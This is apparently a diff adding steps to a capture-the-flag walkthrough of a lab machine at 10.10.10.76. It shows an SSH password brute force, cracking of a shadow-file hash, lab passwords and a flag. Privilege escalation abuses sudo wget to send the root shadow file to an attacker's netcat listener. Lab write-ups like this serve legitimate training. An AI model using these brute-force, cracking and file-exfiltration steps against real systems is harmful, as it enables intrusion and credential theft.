@@ -37,6 +37,72 @@ zsa zsa@10.10.10.76
 
 Now we need to bruteforce the password:
 └─# patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'
+04:59:41 patator    INFO - code  size    time | candidate                          |   num | mesg
+04:59:41 patator    INFO - -----------------------------------------------------------------------------
+05:09:56 patator    INFO - 0     19     1.311 | sunday                             |   880 | SSH-2.0-Sun_SSH_1.3
+Trying to ssh in, I get:
+└─# ssh -p 22022 sunny@10.10.10.76
+Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found.
+Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
+
+And so I do like:
+└─# ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76 
+We find a backup of sammy hash:
+sunny@sunday:~$ cd /
+sunny@sunday:/$ ls
+backup  boot   dev      etc     home    lib         media  net  platform  root   sbin    tmp  var
+bin     cdrom  devices  export  kernel  lost+found  mnt    opt  proc      rpool  system  usr
+sunny@sunday:/$ cd backup
+sunny@sunday:/backup$ ls
+agent22.backup  shadow.backup
+sunny@sunday:/backup$ cat shadow.backup
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+└─# hashcat -m 7400 sammy /usr/share/wordlists/rockyou.txt
+:cooldude!
+sammy@sunday:~/Desktop$ cat user.txt
+a3d9498027ca5187ba1793943ee8a598
+
+============Privelege Escalation==================
+sammy@sunday:~/Desktop$ sudo -l
+User sammy may run the following commands on this host:
+    (root) NOPASSWD: /usr/bin/wget
+Local machine a reverse listener
+└─# nc -lvnp 80
+Victim machine send over the shadow file:
+root:$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD:14146::::::
+daemon:NP:6445::::::
+bin:NP:6445::::::
+sys:NP:6445::::::
+adm:NP:6445::::::
+lp:NP:6445::::::
+uucp:NP:6445::::::
+nuucp:NP:6445::::::
+dladm:*LK*:::::::
+smmsp:NP:6445::::::
+listen:*LK*:::::::
+gdm:*LK*:::::::
+zfssnap:NP:::::::
+xvm:*LK*:6445::::::
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+
 
 
 Interesting reference on rpcbind
